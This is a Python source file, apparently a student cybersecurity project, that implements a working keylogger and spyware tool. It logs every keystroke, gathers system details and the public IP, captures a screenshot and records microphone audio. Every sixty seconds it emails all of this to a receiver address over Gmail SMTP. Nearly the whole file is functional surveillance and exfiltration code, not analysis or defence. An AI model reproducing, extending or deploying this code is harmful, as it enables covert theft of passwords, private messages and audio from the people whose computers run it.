import os
import socket
import platform
import smtplib
import time
import sounddevice as sd
import getpass
import win32clipboard
import threading
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from requests import get
from PIL import ImageGrab
from scipy.io.wavfile import write

# Configuration
keys_information = "key_log.txt"
system_information = "system_info.txt"
screenshot_information = "screenshot.png"
audio_information = "audio.wav"
file_path = "D:\\Cybersecurity Project Keylogger\\Project"
email_address = os.getenv("EMAIL_ADDRESS")  # Use environment variables
email_password = os.getenv("EMAIL_PASSWORD")  # Secure storage
receiver_email = "your_receiver_email@gmail.com"
duration = 10  # Audio recording duration in seconds

# Ensure directory exists
if not os.path.exists(file_path):
    os.makedirs(file_path)

full_keylog_path = os.path.join(file_path, keys_information)
full_system_info_path = os.path.join(file_path, system_information)
full_screenshot_path = os.path.join(file_path, screenshot_information)
full_audio_path = os.path.join(file_path, audio_information)

# Keylogger
count = 0
keys = []


def on_press(key):
    global keys, count
    print(key, flush=True)  # Ensure output is displayed immediately
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(full_keylog_path, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k:
                f.write('\n')
            elif "Key" not in k:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


# System Information Collection
def system_info():
    with open(full_system_info_path, "w") as f:
        f.write(f"System: {platform.system()}\n")
        f.write(f"Node Name: {platform.node()}\n")
        f.write(f"Release: {platform.release()}\n")
        f.write(f"Version: {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Processor: {platform.processor()}\n")
        try:
            public_ip = get("https://api.ipify.org").text
            f.write(f"Public IP: {public_ip}\n")
        except Exception:
            f.write("Could not retrieve IP\n")


# Screenshot Capture
def screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(full_screenshot_path)


# Audio Recording
def record_audio():
    fs = 44100  # Sample rate
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    write(full_audio_path, fs, recording)


# Send Email
def send_email(subject, filename, filepath):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = receiver_email
    msg['Subject'] = subject

    body = "Log file attached."
    msg.attach(MIMEText(body, 'plain'))

    with open(filepath, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={filename}")
        msg.attach(part)

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email_address, email_password)
        server.sendmail(email_address, receiver_email, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Email sending failed: {e}")


# Run Keylogger in a Separate Thread
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# Main Execution
if __name__ == "__main__":
    system_info()
    screenshot()
    record_audio()

    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    # Keep running and send logs periodically
    while True:
        time.sleep(60)  # Send logs every 60 seconds
        send_email("Keylogger Data", keys_information, full_keylog_path)
        send_email("System Information", system_information, full_system_info_path)
        send_email("Screenshot", screenshot_information, full_screenshot_path)
        send_email("Audio Recording", audio_information, full_audio_path)

